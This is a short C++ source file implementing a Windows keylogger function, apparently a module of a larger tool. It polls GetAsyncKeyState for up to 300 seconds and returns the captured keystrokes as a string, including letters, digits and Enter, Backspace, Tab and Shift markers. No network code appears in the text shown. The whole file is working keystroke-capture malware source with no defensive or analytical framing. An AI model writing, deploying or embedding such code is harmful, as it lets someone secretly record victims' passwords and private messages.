#include "Keylogger.h"

#include <windows.h>

#include <chrono>
#include <string>
#include <thread>

namespace keylog {

std::string capture(std::uint32_t seconds) {
    if (seconds == 0 || seconds > 300) seconds = 30;
    std::string out;
    out.reserve(1024);
    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(seconds);
    bool state[256] = {false};
    while (std::chrono::steady_clock::now() < end) {
        for (int vk = 0x08; vk <= 0x5A; ++vk) {
            SHORT s = GetAsyncKeyState(vk);
            bool down = (s & 0x8000) != 0;
            if (down && !state[vk]) {
                if (vk >= 0x30 && vk <= 0x39) out.push_back('0' + (vk - 0x30));
                else if (vk >= 0x41 && vk <= 0x5A) out.push_back(static_cast<char>(vk));
                else if (vk == VK_SPACE) out.push_back(' ');
                else if (vk == VK_RETURN) out.append("[ENTER]");
                else if (vk == VK_BACK) out.append("[BACK]");
                else if (vk == VK_TAB) out.append("[TAB]");
                else if (vk == VK_SHIFT) out.append("[SHIFT]");
                else out.append("[" + std::to_string(vk) + "]");
            }
            state[vk] = down;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    return out;
}

} // namespace keylog
